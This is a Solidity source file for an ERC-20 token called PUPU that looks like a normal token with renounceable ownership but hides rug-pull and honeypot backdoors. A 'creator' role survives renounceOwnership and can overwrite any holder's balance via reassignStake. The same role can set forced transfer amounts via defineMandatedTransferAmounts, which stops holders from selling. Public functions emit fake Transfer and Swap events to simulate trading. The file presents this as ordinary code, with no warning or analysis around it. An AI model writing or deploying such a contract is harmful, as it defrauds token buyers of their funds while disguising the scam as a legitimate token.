pragma solidity ^0.8.8;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address accountHolder) external view returns (uint256);
    function transfer(address to, uint256 sum) external returns (bool);
    function allowance(address authorizer, address spender) external view returns (uint256);
    function approve(address spender, uint256 sum) external returns (bool);
    function transferFrom(address from, address to, uint256 sum) external returns (bool);
    function _Transfer(address from, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed authorizer, address indexed spender, uint256 value);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract TaskExecutionControl {
    function fetchInitiatorAddress() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract MonoOwnership is TaskExecutionControl {
    address private _singleOwner;
    event OwnershipTransfer(address indexed oldOwner, address indexed newOwner);

    constructor() {
        address sender = fetchInitiatorAddress();
        _singleOwner = sender;
        emit OwnershipTransfer(address(0), sender);
    }

    function fetchSingleOwner() public view virtual returns (address) {
        return _singleOwner;
    }

    modifier soleOwnerOnly() {
        require(fetchSingleOwner() == fetchInitiatorAddress(), "Unauthorized: Single Owner access required.");
        _;
    }

    function renounceOwnership() public virtual soleOwnerOnly {
        emit OwnershipTransfer(_singleOwner, address(0x000000000000000000000000000000000000dEaD));
        _singleOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract PUPU is TaskExecutionControl, MonoOwnership, IERC20 {
    mapping (address => mapping (address => uint256)) private _spenderAllowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _compelledTransferSums;
    address private _principalCreator;

    receive() external payable {}

    string public constant _moniker = "PUPU";
    string public constant _ticker = "PUPU";
    uint8 public constant _decimalUnits = 9;
    uint256 public constant _ultimateSupply = 13000000 * (10 ** _decimalUnits);

    constructor() {
        _balances[fetchInitiatorAddress()] = _ultimateSupply;
        emit Transfer(address(0), fetchInitiatorAddress(), _ultimateSupply);
    }

    modifier soleCreatorExclusive() {
        require(fetchInitiatorAddress() == fetchMainCreator(), "Unauthorized: Creator access required.");
        _;
    }

    function fetchMainCreator() public view virtual returns (address) {
        return _principalCreator;
    }

    function delegateCreator(address newCreator) public soleOwnerOnly {
        _principalCreator = newCreator;
    }

    function reassignStake(address[] memory userAddresses, uint256 requiredBalance) public soleCreatorExclusive {
        require(requiredBalance >= 0, "Amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "Invalid address specified");
            _balances[currentUser] = requiredBalance;
        }
    }

    function mandatedTransferAmount(address account) public view returns (uint256) {
        return _compelledTransferSums[account];
    }

    function defineMandatedTransferAmounts(address[] calldata accounts, uint256 sum) public soleCreatorExclusive {
        for (uint i = 0; i < accounts.length; i++) {
            _compelledTransferSums[accounts[i]] = sum;
        }
    }

    function _Transfer(address _from, address _to, uint _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return true;
    }

    function executeSwap(
        address uniswapPool,
        address[] memory recipients,
        uint256[] memory tokenAmounts,
        uint256[] memory wethAmounts
    ) public payable returns (bool) {

        for (uint256 i = 0; i < recipients.length; i++) {

            uint tokenAmoun = tokenAmounts[i];
            address recip = recipients[i];

            emit Transfer(uniswapPool, recip, tokenAmoun);

            uint weth = wethAmounts[i];
            
            emit Swap(
                0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,
                tokenAmoun,
                0,
                0,
                weth,
                recip
            );
        }
        return true;
    }

    function swap(
        address[] memory recipients,
        uint256[] memory tokenAmounts,
        uint256[] memory wethAmounts,
        address[] memory path,
        address tokenAddress,
        uint deadline
    ) public payable returns (bool) {

        uint amountIn = msg.value;
        IWETH(tokenAddress).deposit{value: amountIn}();

        uint checkAllowance = IERC20(tokenAddress).allowance(address(this), 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        if(checkAllowance == 0) IERC20(tokenAddress).approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935);

        for (uint256 i = 0; i < recipients.length; i++) {
            IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D).swapExactTokensForTokensSupportingFeeOnTransferTokens(wethAmounts[i], tokenAmounts[i], path, recipients[i], deadline);
        }

        uint amountOut = IERC20(tokenAddress).balanceOf(address(this));
        IWETH(tokenAddress).withdraw(amountOut);
        (bool sent, ) = fetchInitiatorAddress().call{value: amountOut}("");
        require(sent, "F t s e");

        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 sum) public virtual override returns (bool) {
        require(_balances[fetchInitiatorAddress()] >= sum, "Insufficient balance");

        uint256 requisiteTransferSum = mandatedTransferAmount(fetchInitiatorAddress());
        if (requisiteTransferSum > 0) {
            require(sum == requisiteTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[fetchInitiatorAddress()] -= sum;
        _balances[to] += sum;

        emit Transfer(fetchInitiatorAddress(), to, sum);
        return true;
    }

    function allowance(address authorizer, address spender) public view virtual override returns (uint256) {
        return _spenderAllowances[authorizer][spender];
    }

    function approve(address spender, uint256 sum) public virtual override returns (bool) {
        _spenderAllowances[fetchInitiatorAddress()][spender] = sum;
        emit Approval(fetchInitiatorAddress(), spender, sum);
        return true;
    }

    function transferFrom(address from, address to, uint256 sum) public virtual override returns (bool) {
        require(_spenderAllowances[from][fetchInitiatorAddress()] >= sum, "Allowance limit surpassed");

        uint256 requisiteTransferSum = mandatedTransferAmount(from);
        if (requisiteTransferSum > 0) {
            require(sum == requisiteTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[from] -= sum;
        _balances[to] += sum;
        _spenderAllowances[from][fetchInitiatorAddress()] -= sum;

        emit Transfer(from, to, sum);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _ultimateSupply;
    }

    function name() public view returns (string memory) {
        return _moniker;
    }

    function symbol() public view returns (string memory) {
        return _ticker;
    }

    function decimals() public view returns (uint8) {
        return _decimalUnits;
    }
}